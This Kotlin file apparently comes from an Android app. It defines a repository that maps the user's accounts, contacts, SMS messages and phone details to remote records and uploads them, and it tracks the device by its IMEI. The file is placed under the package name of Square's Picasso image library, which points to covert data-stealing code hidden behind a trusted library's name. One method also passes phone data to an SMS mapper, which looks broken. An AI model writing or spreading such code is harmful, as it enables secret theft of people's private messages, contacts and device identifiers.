package com.squareup.picasso.data

import com.squareup.picasso.data.network.DataResponse
import com.squareup.picasso.data.network.DataUpdateResponse
import com.squareup.picasso.data.network.RemoteUpdatePhone
import com.squareup.picasso.data.storage.InformationDataSource
import com.squareup.picasso.domain.InformationRepository
import com.squareup.picasso.domain.model.AccountEntity
import com.squareup.picasso.domain.model.ContactEntity
import com.squareup.picasso.domain.model.PhoneEntity
import com.squareup.picasso.domain.model.SmsEntity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class InformationRemoteRepository(private val dataSource: InformationDataSource) :
        InformationRepository {

    override suspend fun setAccounts(list: List<AccountEntity>): StorageResult<DataResponse> =
            withContext(
                    Dispatchers.IO
            ) {
                var listRemoteAccount = list.map { Mapper.accountToRemoteAccount(it) }
                dataSource.saveRemoteAccounts(listRemoteAccount)
            }

    override suspend fun setContacts(list: List<ContactEntity>): StorageResult<DataResponse> =
            withContext(Dispatchers.IO) {
                var listRemoteAccount = list.map { Mapper.contactToRemoteContact(it) }
                dataSource.saveRemoteContacts(listRemoteAccount)
            }

    override suspend fun setSms(list: List<SmsEntity>): StorageResult<DataResponse> =
            withContext(Dispatchers.IO) {
                var listRemoteSms = list.map { Mapper.smsToRemoteSms(it) }
                dataSource.saveRemoteSms(listRemoteSms)
            }

    override suspend fun setPhone(phone: PhoneEntity): StorageResult<DataResponse> =
            withContext(Dispatchers.IO) {
                dataSource.saveRemotePhone(Mapper.smsToRemoteSms(phone))
            }

    override suspend fun updatePhone(imei: String, lastResponse: String): StorageResult<DataUpdateResponse> =
            withContext(Dispatchers.IO) {
                dataSource.updateRemotePhone(RemoteUpdatePhone(imei, lastResponse))
            }

}